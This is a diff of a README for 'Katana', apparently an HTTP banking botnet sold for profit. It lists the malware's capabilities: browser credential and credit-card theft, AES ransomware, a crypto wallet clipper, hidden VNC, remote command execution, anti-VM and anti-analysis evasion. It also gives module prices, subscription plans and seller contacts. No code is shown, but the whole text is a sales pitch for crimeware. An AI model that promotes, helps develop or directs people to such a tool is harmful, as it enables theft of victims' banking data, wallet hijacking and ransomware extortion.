@@ -1,7 +1,10 @@
-# KATANA HTTP BANKING BOTNET #
-<h2> Author : ABDO10_DZ </h2>
-<h3> Description [katana] : </h3> katana is an http banking botnet not same of old katana's botnets that same of mirai (ddos,iot exploit)
-this quite different that don't work to access iot devices and don't do ddos attacks it only work by modules below:
+# Katana HTTP BOTNET
+<h3> Author : ABDO10_DZ </h3>
+<h3> Description [katana] : http ( Banking , Ransomware , Hvnc , Clipper , AntiScan , AntiVM ,.. MuteX HTTP Botnet )</h3>
+
+<h3> Features :</h3> 
+
+Connection:	C&C (p2p Secured Connection)
 
     [katana]
 	|__Screenshot
@@ -10,32 +13,32 @@ this quite different that don't work to access iot devices and don't do ddos att
 	|__CMD/Powershell_Exec
 	|__info
 	|__[Modules]
-	       |__LoginGrapper & [Credit Card Grapper] & History (supported Browsers: Firefox Based,Chrome Based)
-	       |__RansomWare (AES)
-	       |__HVNC
+	       |__Logins Grapper & Credit Cards Grapper & History (supported Browsers: Firefox Based,Chrome Based) [grap on going]
+	       |__Ransomware (AES->random decrypt key for every infect)
+	       |__AntiVM (Vmware , VirtualBox , sandbox ..etc)
+	       |__AntiAnalyse (Wireshark & -like tools / debug / de-assembly / ..etc)
 	       |__Clipper (Crypto Wallets)
-	       |__AntiVM (Vmware , VirtualBox)
-	       |__AntiAnalyse (Wireshark & -like tools)
+	       |__Hvnc ([client-server]->hidden desktop over tunnel proxies)
 
-<h3> Contact :</h3> abdo10_dz@pm.me , https://t.me/abdo10_dz 
-<h3> Donate (crypto only) : contact us for that
-<h3> Greetz :</h3> Mathio.DZ -> (The GodFather) 
+<h3> Buy This Product ? </h3>
 
-<h3> For buying this product </h3>
+<h5>Panel : </h5>
+Our Working Plans : we give u yearly , 6Month , 3 Month Subscribtion in our Katana Botnet 
+ Price of Plans : 1 Year = 110$ , 6 Month = 60$ ,3 Month = 30$
 
-	katana botnet with it's basic functions : 200$ 
-	[Modules] :
-	Grapper : 300$
-	RansomWare : 200$
-	Clipper : 100$
-	HVNC : 300$
+<h5>Build.exe [213KB] Or build.dll [298KB]:</h5>
+	<p>katana botnet with it's basic functions : 200$
+	<p>[Modules] :
+	<p>Grapper : 300$
+	<p>RansomWare : 200$
+	<p>Hvnc : 300$
+	<p>Clipper : 50$
+	<p>All in One : 800$ Free 60$ for ur Self
 	rebuild : 20$
-	
-	All in One : 1100$
 
-<h3> Our Working Plans :</h3> we give u yearly , 6Month , 3 Month Subscribtion in our Katana Botnet 
-<h3> Price of Plans :</h3> 1 Year = 110$ , 6 Month = 60$ ,3 Month = 30$
+<h5> Contact : abdo10_dz@pm.me , https://t.me/abdo10_dz </h5>
+<h5> Donate (btc): we accept only crypto donations contact us to donate , and Thank you very much .</h5> 
+<h5> Greetz : Mathio.DZ -> (GodFather)</h3> 
 
-<h3>Overview :</h3>
-
+<h5>Overview : u can wait till it's being uploaded</h5>
 
